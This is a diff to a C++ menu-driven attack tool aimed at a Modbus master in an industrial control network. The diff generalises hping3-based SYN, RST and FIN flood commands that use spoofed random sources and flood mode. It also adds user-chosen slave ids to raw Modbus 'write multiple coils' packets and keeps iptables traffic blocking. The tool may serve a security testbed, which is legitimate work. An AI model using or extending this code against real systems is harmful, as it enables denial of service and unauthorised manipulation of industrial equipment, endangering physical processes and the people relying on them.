@@ -14,13 +14,15 @@ using namespace std;
 #define print(x) 
 #endif
 
+#define TOHEX(x) 0x#x
+
 enum cyberattacks {
      BLOCK=1,
      UNBLOCK,
      SYNFLOOD,
      RST,
      MODBUSPKT,
-     FIN //Final enum. Do not modify .
+     FIN //Final enum. Do not modify .Add new values before this. 
 };
 
 enum tcpfloodattacktypes {
@@ -28,7 +30,7 @@ enum tcpfloodattacktypes {
      FIXEDDURATION,
      FASTPACKETCOUNTFLOOD,
      PACKETSPERSEC,
-     ENDOFENUM //Final enum value. Do not modify.
+     ENDOFENUM //Final enum value. Do not modify.Add new values before this.
 };
 string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                        "FIXEDDURATION",
@@ -36,10 +38,18 @@ string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                        "PACKETSPERSEC",
                                        };
 
-string globalDisplayString = "Please select a Cyber Attack To Perform.\n 1. Block the communication towards master.\n 2. Unblock Traffic \n 3. Execute a SYN flood attack towards the Modbus Master\n 4. Execute a TCP RST attack towards the Modbus Master\n 5. Modbus packet send 6. Execute a TCP FIN attack towards the Modbus Master\n ";
+string cyberAttackString[FIN]={"Block Communication towards Master.",
+                                 "Unblock Traffic towards Master.",
+                                 "Execute SYN Flood attack towards Modbus Master.",
+                                 "Execute a TCP RST attack towards Modbus Master.",
+				 "Send a Modbus packet towards Modbus Master. ",
+                                 "Execute a TCP FIN attack towards Modbus Master. "
+                                };
+                                  
 
 //Process Functions
                              
+void displayGlobalAttackTypes(void);
 void displayOptions(void);
 bool validateInput(int inputOption);
 void processInput(int inputOption);
@@ -50,7 +60,7 @@ void blockTraffic(const string ip,const string port);
 void unblockTraffic(const string ip, const string port);
 
 // TCP flood functions
-void tcpSynFloodAttack(void);
+void floodAttacks(const string attackType);
 tcpfloodattacktypes selectTcpSynFloodAttack(void);
 
 //Modbus packet generation function
@@ -68,8 +78,9 @@ int main(int argv,char *argc[])
 
 void displayOptions(void)
 {
-   cout<<globalDisplayString;
+   //cout<<globalDisplayString;
    //int inputOption=-1;
+   displayGlobalAttackTypes();
    int inputOption=0;
    string inputStr="";
    while(1)
@@ -136,7 +147,7 @@ void processInput(int inputOption)
           break;
        case SYNFLOOD:
           print("SYN FLOOD TRAFFIC"<<endl);
-          tcpSynFloodAttack();
+          floodAttacks("S");
           break;
        case RST:
           print("RST TRAFFIC"<<endl);
@@ -187,7 +198,7 @@ void unblockTraffic(const string ip,const string port)
     print("The Current firewall rules are as below. "<<endl);
     system("iptables -L -n");
 }
-void tcpSynFloodAttack(void)
+void floodAttacks(const string attackType)
 {
     
    tcpfloodattacktypes tcpAttackType = selectTcpSynFloodAttack();
@@ -208,8 +219,8 @@ void tcpSynFloodAttack(void)
          print("Input the number of packets to send :: ");
          getline(cin,packetCount);
          commandStr= "hping3 -c " + packetCount + 
-                      " -d " + packetSize +
-                      " -S -w 64 -p " + port +
+                      " -d " + packetSize + " -" + attackType +
+                      " -w 64 -p " + port +
                       " --flood --rand-source " + targetIP;
       }       
         break;
@@ -233,8 +244,8 @@ void tcpSynFloodAttack(void)
         packetCount=static_cast<ostringstream *>(&(ostringstream() << (totalPkts)) )->str();
         string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
         commandStr= "hping3 -c " + packetCount + 
-                      " -d " + packetSize +
-                      " -S -w 64 -i "+packetInterval+ " -p " + port +
+                      " -d " + packetSize + " -" + attackType +
+                      " -w 64 -i "+packetInterval+ " -p " + port +
                       " --rand-source " + targetIP;
 
       }
@@ -291,6 +302,20 @@ tcpfloodattacktypes selectTcpSynFloodAttack(void)
   return (tcpfloodattacktypes)floodOption;
 }
 
+void displayGlobalAttackTypes(void)
+{
+  string displayStr="";
+  string numstr="";
+  int i =0;
+  for( ;i<FIN;i++)
+  {
+    numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)) )->str();
+    displayStr += numstr + "."+cyberAttackString[i]+" \n";
+  }
+  print(displayStr<<endl);
+
+}
+
 void sendModbusPacket(void)
 {
   modbus_t *mb;
@@ -307,9 +332,13 @@ void sendModbusPacket(void)
   {
    stringstream inputStream(inputStr);
    inputStream >> modbusPort1 ;
+   cout<<modbusSlave1<<endl;
   }
+   int input ;
+   print("Enter the slave id: ");
+   std::cin >> input ;
+   std::cout << "0x" << std::hex << input << '\n' ;
   //Modbus slave which is a TCP master
-  cout<<modbusSlave1<<endl;
   mb = modbus_new_tcp(modbusSlave1.c_str(),modbusPort1);
   if (modbus_connect(mb) == -1) {
                print("Connection failed:" << modbus_strerror(errno));
@@ -328,7 +357,8 @@ void sendModbusPacket(void)
 
   //uint8_t raw_req[] = {0x01/*slave id*/, 0x0B/*func code*/, 0x00, 0x01/*ref num*/, 0x00, 0x00/*word count*/ }; 
   //Request slave id;
-  uint8_t raw_req[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
+  //uint8_t raw_req[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
+  uint8_t raw_req[] = {input/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
   int req_length = modbus_send_raw_request(mb, raw_req, 8 * sizeof(uint8_t));
   uint8_t raw_req2[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
   //req_length = modbus_send_raw_request(mb2, raw_req2, 8 * sizeof(uint8_t));
